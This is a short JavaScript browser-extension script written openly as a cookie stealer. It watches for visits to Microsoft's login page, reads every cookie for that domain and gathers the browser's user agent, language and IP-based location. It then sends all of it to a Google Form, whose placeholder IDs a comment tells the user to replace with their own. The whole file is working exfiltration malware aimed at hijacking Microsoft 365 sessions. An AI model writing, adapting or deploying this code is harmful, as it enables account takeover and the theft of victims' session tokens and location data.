function extractAndExfiltrateCookies() {
  chrome.cookies.getAll({}, (cookies) => {
    const filteredCookies = cookies.filter(cookie =>
      cookie.domain.includes("login.microsoftonline.com")
    );

    if (filteredCookies.length === 0) return;

    exfiltrateStructuredData(filteredCookies);
  });       
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.url && changeInfo.url.includes("https://login.microsoftonline.com")) {
    extractAndExfiltrateCookies();
  }
});

function exfiltrateStructuredData(cookies) {
  const userAgent = navigator.userAgent;
  const language = navigator.language || navigator.userLanguage;  

  fetch("http://ip-api.com/json")
    .then(response => response.json())
    .then(location => {
      const payload = {
        userAgent: userAgent,
        language: language,             
        ip: location.query,
        city: location.city,
        region: location.regionName,
        country: location.country,
        coordinates: {
          latitude: location.lat,
          longitude: location.lon
        },
        cookies: cookies
      };

      const formData = new URLSearchParams();
      formData.append("entry.XXXXXXXXXX", JSON.stringify(payload)); // replace with your google form entry.id and form-id

      return fetch("https://docs.google.com/forms/d/e/<GFORM_ID>/formResponse", {
        method: "POST",
        mode: "no-cors",
        body: formData,
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        }
      });
    })
    .then(() => console.log("Structured session data submitted"))
    .catch(err => console.error("Submission failed:", err));
}
